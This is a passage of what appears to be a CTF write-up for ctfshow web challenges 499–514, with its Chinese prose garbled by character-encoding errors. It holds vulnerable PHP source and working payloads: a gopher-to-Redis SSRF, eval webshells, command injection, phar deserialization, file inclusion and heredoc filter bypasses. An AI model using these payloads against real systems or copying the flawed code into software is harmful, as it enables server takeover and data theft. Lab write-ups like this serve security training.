<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
</code></pre>
<p>è¿æ¥shell.phpï¼Œflagåœ¨æ ¹ç›®å½•ã€‚</p>
<h2 id="web499">web499</h2>
<p>ç™»å½•åå°ï¼Œç³»ç»Ÿé…ç½®åŠŸèƒ½å¤„ï¼Œèƒ½ä¿®æ”¹é…ç½®ä¿¡æ¯ã€‚</p>
<p>æ³¨å…¥phpä»£ç è¿›<code>/config/settings.php</code></p>
<h2 id="web500">web500</h2>
<p>ä¿®æ”¹äº†é…ç½®æ–‡ä»¶çš„åç¼€ï¼Œæ— æ³•è§£æäº†ã€‚</p>
<p>admin_settings.php</p>
<pre><code class="language-php">&lt;?php

session_start();

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){
	$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
	foreach ($_POST as $key =&gt; $value) {
		$config[$key]=$value;
	}
	file_put_contents(__DIR__.'/../config/settings', serialize($config));
	$ret['msg']='ç®¡ç†å‘˜ä¿¡æ¯ä¿®æ”¹æˆåŠŸ';
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>æŸ¥çœ‹æ•°æ®ç®¡ç†çš„æ•°æ®åº“å¤‡ä»½åŠŸèƒ½å¤„<br>
/api/admin_db_backup</p>
<pre><code class="language-php">&lt;?php

session_start();

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){
	extract($_POST);
	shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.$db_path);


	if(file_exists(__DIR__.'/../backup/'.$db_path)){
		$ret['msg']='æ•°æ®åº“å¤‡ä»½æˆåŠŸ';
	}else{
		$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥</p>
<pre><code>db.zip&amp;&amp;cat /flag_bei_ni_fa_xian_le &gt;1.txt
</code></pre>
<h2 id="web501">web501</h2>
<p>å‘½ä»¤æ³¨å…¥å¤„æ·»åŠ äº†æ­£åˆ™åŒ¹é…ï¼Œè¿˜æ˜¯å¯ä»¥æ³¨å…¥ã€‚</p>
<pre><code class="language-php">&lt;?php

session_start();


error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){
	extract($_POST);

	if(preg_match('/^zip|tar|sql$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format);
		if(file_exists(__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format)){
			$ret['msg']='æ•°æ®åº“å¤‡ä»½æˆåŠŸ';
		}else{
			$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
		}
	}else{
		$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
	}
	
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>payload</p>
<pre><code>db_format=zip;cat /flag_bei_ni_fa_xian_le &gt;1.txt
</code></pre>
<h2 id="web502">web502</h2>
<p>ç³»çµ±é…ç½®åŠŸèƒ½å¤„å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œä¸”åªæœ‰å‰å°æ ¡éªŒæ–‡ä»¶ç±»å‹ã€‚</p>
<p>api/admin_upload.php</p>
<pre><code class="language-php">&lt;?php
$arr = $_FILES[&quot;file&quot;];
	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
	{
		$arr[&quot;tmp_name&quot;];
		$filename = md5($arr['name']);
		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
		if(!preg_match('/^php$/i', $ext)){
			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$config['logo']=$filename.'.' . $ext;
			file_put_contents(__DIR__.'/../config/settings', serialize($config));
			$ret['msg']='æ–‡ä»¶ä¸Šä¼ æˆåŠŸ';
		}
		
	}else{
		$ret['msg']='æ–‡ä»¶ä¸Šä¼ å¤±è´¥';
	}
	
	die(json_encode($ret));
</code></pre>
<p>åå°ä¼šæ ¡éªŒï¼Œä¸è®©åç¼€ä¸ºphpï¼Œè€ƒè™‘ç”¨å…¶ä»–åç¼€æ¥ç»•è¿‡ï¼Œå•å‘ç°éƒ½ä¸è§£æã€‚ã€‚ã€‚</p>
<p>ä¸Šä¼ æ–‡ä»¶è·¯å¾„ä¸º<code>/img/md5(&quot;filename&quot;).phtml</code><br>
ä¹Ÿå¯ä»¥åœ¨<code>config/settings</code>ä¸­çœ‹åˆ°è·¯å¾„</p>
<p>å‘ç°ä¹‹å‰çš„å‘½ä»¤æ³¨å…¥å¤„ä¾ç„¶å¯ä»¥åˆ©ç”¨<br>
api/admin_db_backup.php</p>
<pre><code class="language-php">&lt;?php
session_start();

include('../render/db_class.php');
error_reporting(0);
$user= $_SESSION['user'];
$pre=__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'/db.';
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){
	extract($_POST);
	if(file_exists($pre.$db_format)){
			$ret['msg']='æ•°æ®åº“å¤‡ä»½æˆåŠŸ';
			die(json_encode($ret));
	}

	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.$pre.$db_format);
		if(file_exists($pre.$db_format)){
			$ret['msg']='æ•°æ®åº“å¤‡ä»½æˆåŠŸ';
		}else{
			$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
		}
	}else{
		$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>æ­£åˆ™æ·»åŠ æ‹¬å·åï¼Œæ— æ³•å†ç»•è¿‡äº†ï¼Œä½†æ˜¯å¤šäº†ä¸€ä¸ªpreå‚æ•°å¯ä»¥åˆ©ç”¨ã€‚</p>
<pre><code>db_format=zip&amp;pre=1;cat /flag_bei_ni_fa_xian_le &gt; /var/www/html/1.txt;echo
</code></pre>
<h2 id="web503">web503</h2>
<p>api/admin_db_backup.php</p>
<pre><code class="language-php">&lt;?php
extract($_POST);
	if(file_exists($pre.$db_format)){
			$ret['msg']='æ•°æ®åº“å¤‡ä»½æˆåŠŸ';
			die(json_encode($ret));
	}

	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.md5($pre.$db_format));
		if(file_exists($pre.$db_format)){
			$ret['msg']='æ•°æ®åº“å¤‡ä»½æˆåŠŸ';
		}else{
			$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
		}
	}else{
		$ret['msg']='æ•°æ®åº“å¤‡ä»½å¤±è´¥';
	}
	die(json_encode($ret));
</code></pre>
<p>è¿™é‡Œä½¿ç”¨md5çš„æ–¹å¼ï¼Œæ— æ³•è¿›è¡Œæ³¨å…¥äº†ã€‚<br>
å­˜åœ¨file_existså‡½æ•°ï¼Œå¹¶ä¸”ç½‘ç«™logoå¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚<br>
å¯ä»¥è€ƒè™‘ä½¿ç”¨phar://ååºåˆ—åŒ–ã€‚å‚è€ƒæ–‡ç« <a href="https://xz.aliyun.com/t/6699">phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£--phar</a></p>
<p>ç”ŸæˆpharåŒ…</p>
<pre><code class="language-php">&lt;?php
class dbLog{
    public $sql;
    public $content=&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;;
    public $log=&quot;/var/www/html/1.php&quot;;
}

$c=new dbLog();

$phar = new Phar(&quot;ctfshow.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
$phar-&gt;setMetadata($c); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
$phar-&gt;addFromString(&quot;a&quot;, &quot;a&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
$phar-&gt;stopBuffering();

?&gt;
</code></pre>
<p>ä¿®æ”¹åä¸ºpngä¸Šä¼ <br>
<img src="https://fallingskies22.github.io/post-images/1723285773930.png" alt="" loading="lazy"></p>
<p>å†æ•°æ®åº“å¤‡ä»½åŠŸèƒ½å¤„ï¼Œè§¦å‘å‘åºåˆ—åŒ–<br>
<img src="https://fallingskies22.github.io/post-images/1723285800542.png" alt="" loading="lazy"></p>
<p>è®¿é—®shellå³å¯è·å¾—flagã€‚</p>
<h2 id="web504">web504</h2>
<p>å¢åŠ äº†æ¨¡æ¿ç®¡ç†åŠŸèƒ½ã€‚<br>
åœ¨æ–°å¢æ¨¡æ¿åŠŸèƒ½å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œä¸”å­˜åœ¨ç›®å½•ç©¿è¶Šã€‚<br>
åˆ©ç”¨<code>/api/admin_settings.php</code>ä¸­çš„/config/settingsæ¥è§¦å‘ååºåˆ—åŒ–ã€‚</p>
<p>ä¸Šä¼ æ–‡ä»¶</p>
<pre><code>name=../config/settings&amp;content=%4f%3a%35%3a%22%64%62%4c%6f%67%22%3a%33%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%73%3a%30%3a%22%22%3b%73%3a%37%3a%22%63%6f%6e%74%65%6e%74%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%3b%73%3a%33%3a%22%6c%6f%67%22%3b%73%3a%31%39%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%7d;
</code></pre>
<p>è®¿é—®/api/admin_settings.php<br>
è¿æ¥1.php</p>
<h2 id="web505">web505</h2>
<p>å¢åŠ äº†ä¸€ä¸ªæ–‡ä»¶æŸ¥çœ‹åŠŸèƒ½ï¼Œç”¨æ¥çœ‹æºç ã€‚<br>
api/admin_file_view.php</p>
<pre><code class="language-php">&lt;?php

session_start();

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){

	extract($_POST);
	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
		include($f);
	}else{
		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
	}
	$ret['msg']='æŸ¥çœ‹æˆåŠŸ';
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p>
<p>ä¸Šä¼ æ–‡ä»¶å</p>
<pre><code>f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png&amp;debug=1&amp;1=system('cat /flag_is_here_aabbcc');
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1723367239702.png" alt="" loading="lazy"></figure>
<h2 id="web506">web506</h2>
<p>api/admin_file_view.php</p>
<pre><code class="language-php">&lt;?php

session_start();

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){

	extract($_POST);
	$ext = substr($f, strlen($f)-3,3);
	if(preg_match('/php|sml|phar/i', $ext)){
		$ret['msg']='è¯·ä¸è¦ä½¿ç”¨æ­¤åŠŸèƒ½';
		die(json_encode($ret));
	}
	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
		include($f);
	}else{
		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
	}
	$ret['msg']='æŸ¥çœ‹æˆåŠŸ';
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>å¢åŠ äº†é™åˆ¶ï¼Œæ–‡ä»¶ååç¼€ä¸èƒ½ä¸ºphp,sml,phar</p>
<p>ç”¨ä¸Šé¢˜æ–¹æ³•ä¾ç„¶å¯ä»¥</p>
<h2 id="web507">web507</h2>
<h2 id="web508">web508</h2>
<p>åŒä¸Š</p>
<h2 id="web509">web509</h2>
<p>api/admin_file_view.php</p>
<pre><code class="language-php">&lt;?php

session_start();

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){

	extract($_POST);
	if(preg_match('/php|sml|phar|\:|data|file/i', $f)){
		$ret['msg']='è¯·ä¸è¦ä½¿ç”¨æ­¤åŠŸèƒ½';
		die(json_encode($ret));
	}
	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
		include($f);
	}else{
		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
	}
	$ret['msg']='æŸ¥çœ‹æˆåŠŸ';
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>åˆå¢åŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ã€‚</p>
<p>æ–‡ä»¶ä¸Šä¼ å¤„ï¼Œå¯¹å†…å®¹ä¹Ÿåšäº†è¿‡æ»¤<br>
api/admin_upload.php</p>
<pre><code class="language-php">&lt;?php
$arr = $_FILES[&quot;file&quot;];
	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
	{
		$arr[&quot;tmp_name&quot;];
		$filename = md5($arr['name']);
		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
		if(!preg_match('/^php$/i', $ext)){
			if(preg_match('/php|sml|phar|\:|data|file/i', file_get_contents($arr[&quot;tmp_name&quot;]))){
                	$ret['msg']='è¯·ä¸è¦ä½¿ç”¨æ­¤åŠŸèƒ½';
                	die(json_encode($ret));
        		}

			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$config['logo']=$filename.'.' . $ext;
			file_put_contents(__DIR__.'/../config/settings', serialize($config));
			$ret['msg']='æ–‡ä»¶ä¸Šä¼ æˆåŠŸ';
		}
		
	}else{
		$ret['msg']='æ–‡ä»¶ä¸Šä¼ å¤±è´¥';
	}
</code></pre>
<p>ä½¿ç”¨çŸ­æ ‡ç­¾ï¼Œç»•è¿‡<code>php</code>å…³é”®å­—</p>
<pre><code class="language-php">user&lt;?= @eval($_POST[1]);?&gt;
</code></pre>
<h2 id="web510">web510</h2>
<p>api/admin_upload.php</p>
<pre><code class="language-php">&lt;?php
$arr = $_FILES[&quot;file&quot;];
	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
	{
		$arr[&quot;tmp_name&quot;];
		$filename = md5($arr['name']);
		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
		if(!preg_match('/^php$/i', $ext)){
			if(preg_match('/php|sml|phar|\:|data|file|&lt;|&gt;|\`|\?|=/i', file_get_contents($arr[&quot;tmp_name&quot;]))){
                	$ret['msg']='è¯·ä¸è¦ä½¿ç”¨æ­¤åŠŸèƒ½';
                	die(json_encode($ret));
        		}

			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$config['logo']=$filename.'.' . $ext;
			file_put_contents(__DIR__.'/../config/settings', serialize($config));
			$ret['msg']='æ–‡ä»¶ä¸Šä¼ æˆåŠŸ';
		}
		
	}else{
		$ret['msg']='æ–‡ä»¶ä¸Šä¼ å¤±è´¥';
	}
</code></pre>
<p>ç°åœ¨åŸºæœ¬ä¸Šå†…å®¹å…¨è¿‡æ»¤äº†ï¼Œæ— æ³•ç»•è¿‡ã€‚</p>
<p>æŸ¥çœ‹sessionæ–‡ä»¶å‘ç°åˆšå¥½æ»¡è¶³ï¼Œuserå¼€å¤´çš„æ ¼å¼ï¼Œå¹¶ä¸”å†…å®¹å¯æ§ã€‚<br>
<img src="https://fallingskies22.github.io/post-images/1723459255367.png" alt="" loading="lazy"></p>
<p>æŸ¥çœ‹ç”Ÿæˆsessionä»£ç <br>
index.php</p>
<pre><code class="language-php">&lt;?php

session_start();
include('render/render_class.php');
include('render/db_class.php');


$action=$_GET['action'];

...

switch ($action) {
	case 'check':
		$username=$_POST['username'];
		$password=$_POST['password'];
		if(!preg_match('/file|or|innodb|sys|mysql/i', $username)){
			$sql = &quot;select username,nickname,avatar from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
			$db=new db();
			$user=$db-&gt;select_one_array($sql);
		}
		if($user){
			$_SESSION['user']=$user;
			header('location:index.php?action=index');
		}else{
			templateUtil::render('error');
		}
		break;
	case 'clear':
		system('rm -rf cache/*');
		die('cache clear');
		break;
	case 'login':
		templateUtil::render($action);
		break;
	case 'index':
		$user=$_SESSION['user'];
		if($user){
			templateUtil::render('index',$user);
		}else{
			header('location:index.php?action=login');
		}
		break;
	case 'view':
		$user=$_SESSION['user'];
		if($user){
			templateUtil::render($_GET['page'],$user);
		}else{
			header('location:index.php?action=login');
		}
		break;
	case 'logout':
		session_destroy();
		header('location:index.php?action=login');
		break;
	default:
		templateUtil::render($action);
		break;
}

</code></pre>
<p>åœ¨åŸºæœ¬èµ„æ–™å¤„ä¿®æ”¹æ˜µç§°ä¸º<code>&lt;?php @eval($_POST[1])?&gt;</code></p>
<p>ä½¿ç”¨æ–‡ä»¶åŒ…å«ç‚¹<br>
<img src="https://fallingskies22.github.io/post-images/1723460673813.png" alt="" loading="lazy"></p>
<h2 id="web511">web511</h2>
<p>sessä¹Ÿè¿‡æ»¤äº†<br>
api/admin_file_view.php</p>
<pre><code class="language-php">&lt;?php
extract($_POST);
        if(preg_match('/php|sml|phar|\:|data|file|sess/i', $f)){
                $ret['msg']='è¯·ä¸è¦ä½¿ç”¨æ­¤åŠŸèƒ½';
                die(json_encode($ret));
        }
        if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
                include($f);
        }else{
                $ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
        }
        $ret['msg']='æŸ¥çœ‹æˆåŠŸ';
        die(json_encode($ret));
</code></pre>
<p>æŸ¥çœ‹æ¨¡æ¿æ¸²æŸ“ä»£ç <br>
render/render_class.php</p>
<pre><code class="language-php">&lt;?php

include('file_class.php');
include('cache_class.php');

class templateUtil {
	public static function render($template,$arg=array()){
		$templateContent=fileUtil::read('templates/'.$template.'.sml');
		$cache=templateUtil::shade($templateContent,$arg);
		echo $cache;
	}
	public static  function shade($templateContent,$arg=array()){
		$templateContent=templateUtil::checkImage($templateContent,$arg);
		$templateContent=templateUtil::checkConfig($templateContent);
		$templateContent=templateUtil::checkVar($templateContent,$arg);
		foreach ($arg as $key =&gt; $value) {
			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
		}
		return $templateContent;
	}

	public static function checkImage($templateContent,$arg=array()){
		foreach ($arg as $key =&gt; $value) {
			if(preg_match('/gopher|file/i', $value)){
				$templateContent=str_replace('{{img:'.$key.'}}', '', $templateContent);
			}
			if(stripos($templateContent, '{{img:'.$key.'}}')){
				$encode='';
				if(file_exists(__DIR__.'/../cache/'.md5($value))){
					$encode=file_get_contents(__DIR__.'/../cache/'.md5($value));
				}else{
					$ch=curl_init($value);
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					$result=curl_exec($ch);
					curl_close($ch);
					$ret=chunk_split(base64_encode($result));
					$encode = 'data:image/jpg/png/gif;base64,' . $ret;
					file_put_contents(__DIR__.'/../cache/'.md5($value), $encode);
				}
				$templateContent=str_replace('{{img:'.$key.'}}', $encode, $templateContent);
			}
			
		}
		return $templateContent;
	}
	public static function checkConfig($templateContent){
		$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
		foreach ($config as $key =&gt; $value) {
			if(stripos($templateContent, '{{config:'.$key.'}}')){
				$templateContent=str_replace('{{config:'.$key.'}}', $value, $templateContent);
			}
			
		}
		return $templateContent;
	}

	public static function checkVar($templateContent,$arg){
		foreach ($arg as $key =&gt; $value) {
			if(stripos($templateContent, '{{var:'.$key.'}}')){
				eval('$v='.$value.';');
				$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
			}
		}
		return $templateContent;
	}


}
</code></pre>
<p><code>checkVar</code>å‡½æ•°ä¸­æœ‰<code>eval</code>å‡½æ•°ï¼Œè€ƒè™‘åˆ©ç”¨å®ƒæ¥å‘½ä»¤æ‰§è¡Œã€‚<br>
è¿™é‡Œè¦é€šè¿‡<code>stripos</code>å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦åœ¨æ ‡ç­¾å‰åŠ å…¶ä»–å­—ç¬¦ã€‚</p>
<p>ä½¿ç”¨æ–°å¢æ¨¡æ¿åŠŸèƒ½</p>
<pre><code>new.sml
123{{var:nickname}}
</code></pre>
<p>æ›´æ”¹æ˜µç§°ä¸º</p>
<pre><code>`cat /flag_is_here_sf`
</code></pre>
<p>è®¿é—®æ¨¡æ¿<br>
<code>/index.php?action=view&amp;page=new</code></p>
<h2 id="web512">web512</h2>
<p>checkVarå‡½æ•°å¤„å¢åŠ äº†è¿‡æ»¤</p>
<pre><code class="language-php">&lt;?php
public static function checkVar($templateContent,$arg){
		$db=new db();
		foreach ($arg as $key =&gt; $value) {
			if(stripos($templateContent, '{{var:'.$key.'}}')){
				if(!preg_match('/\(|\[|\`|\'|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i', $value)){
					eval('$v='.$value.';');
					$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
				}
				
			}
		}
		return $templateContent;
	}
</code></pre>
<p>ä½¿ç”¨EOFæ¥ç»•è¿‡å¼•å·</p>
<pre><code>1;
$a = &lt;&lt;&lt;EOF
&lt;?php includ
EOF;
$b = &lt;&lt;&lt;EOF
e $
EOF;
$c = &lt;&lt;&lt;EOF
_POS
EOF;
$d = &lt;&lt;&lt;EOF
T{1}?&gt;
EOF;
$e = &lt;&lt;&lt;EOF
11.php
EOF;
$db-&gt;log-&gt;log=$e;
$db-&gt;log-&gt;content=$a.$b.$c.$d;
</code></pre>
<p>ä½¿ç”¨ç™»å½•å¤„çš„sqlæ³¨å…¥æ¥ç»•è¿‡ä¿®æ”¹ä¿¡æ¯æ—¶çš„é•¿åº¦é™åˆ¶ã€‚</p>
<pre><code>action=check&amp;username=1'%20union%20select%20%22%31%3b%0a%24%61%20%3d%20%3c%3c%3c%45%4f%46%0a%3c%3f%70%68%70%20%69%6e%63%6c%75%64%0a%45%4f%46%3b%0a%24%62%20%3d%20%3c%3c%3c%45%4f%46%0a%65%20%24%0a%45%4f%46%3b%0a%24%63%20%3d%20%3c%3c%3c%45%4f%46%0a%5f%50%4f%53%0a%45%4f%46%3b%0a%24%64%20%3d%20%3c%3c%3c%45%4f%46%0a%54%7b%31%7d%3f%3e%0a%45%4f%46%3b%0a%24%65%20%3d%20%3c%3c%3c%45%4f%46%0a%31%31%2e%70%68%70%0a%45%4f%46%3b%0a%24%64%62%2d%3e%6c%6f%67%2d%3e%6c%6f%67%3d%24%65%3b%0a%24%64%62%2d%3e%6c%6f%67%2d%3e%63%6f%6e%74%65%6e%74%3d%24%61%2e%24%62%2e%24%63%2e%24%64%3b%22%2c2%2c3%23&amp;password=123&amp;random=1
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1723474298038.png" alt="" loading="lazy"></figure>
<p>åˆ›å»ºæ¨¡æ¿æ–‡ä»¶</p>
<pre><code>123{{var:username}}
</code></pre>
<p>è®¿é—®æ¨¡æ¿æ–‡ä»¶åï¼Œç”Ÿæˆ11.php<br>
<img src="https://fallingskies22.github.io/post-images/1723474360958.png" alt="" loading="lazy"></p>
<h2 id="web513">web513</h2>
<p>render/render_class.php</p>
<pre><code class="language-php">&lt;?php
public static function checkVar($templateContent,$arg){
		$db=new db();
		foreach ($arg as $key =&gt; $value) {
			if(stripos($templateContent, '{{var:'.$key.'}}')){
				if(!preg_match('/\(|\[|\`|\'|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i', $value)){
					eval('$v='.$value.';');
					$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
				}
				
			}
		}
		return $templateContent;
	}

	public static function checkFoot($templateContent){
		if ( stripos($templateContent, '{{cnzz}}')) {
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$foot = $config['cnzz'];
			if(is_file($foot)){
				$foot=file_get_contents($foot);
				include($foot);
			}
			
		}
		return $templateContent;
	}
</code></pre>
<p>checkVarå‡½æ•°åˆå¢åŠ äº†è¿‡æ»¤ï¼Œæ— æ³•ç»•è¿‡ã€‚<br>
å¢åŠ äº†ä¸€ä¸ªcheckFootå‡½æ•°ã€‚</p>
<p>ä¿®æ”¹æ˜µç§°ä¸º</p>
<pre><code class="language-php">&lt;?=`cat /f*`?&gt;
</code></pre>
<p>åˆ›å»ºæ¨¡æ¿æ–‡ä»¶path.sml</p>
<pre><code>/tmp/sess_tjr3uviphhcn9f3cocfi77gl37
</code></pre>
<p>åˆ›å»ºæ¨¡æ¿æ–‡ä»¶new.sml</p>
<pre><code>123{{cnzz}}
</code></pre>
<p>ä¿®æ”¹ç³»ç»Ÿé…ç½®ä¸­é¡µé¢ç»Ÿè®¡å¤„ä¸º<code>/var/www/html/templates/path.sml</code></p>
<p>è®¿é—®<code>/index.php?action=view&amp;page=new</code>è§¦å‘checkFootå‡½æ•°å³å¯ã€‚</p>
<h2 id="web514">web514</h2>
<p>checkFootå‡½æ•°ä¹Ÿå¢åŠ äº†è¿‡æ»¤</p>
<pre><code class="language-php">&lt;?php
public static function checkFoot($templateContent){
		if ( stripos($templateContent, '{{cnzz}}')) {
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$foot = $config['cnzz'];
			if(is_file($foot)){
				$foot=file_get_contents($foot);
				if(!preg_match('/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\{|\(|_/', $foot)){
					include($foot);
				}
				
			}
			
		}
		return $templateContent;
	}
</code></pre>
<p>åˆ›å»ºæ¨¡æ¿æ–‡ä»¶path.sml</p>
<pre><code>/var/www/html/config/settings
</code></pre>
<p>åˆ›å»ºæ¨¡æ¿æ–‡ä»¶new.sml</p>
<pre><code>123{{cnzz}}
</code></pre>
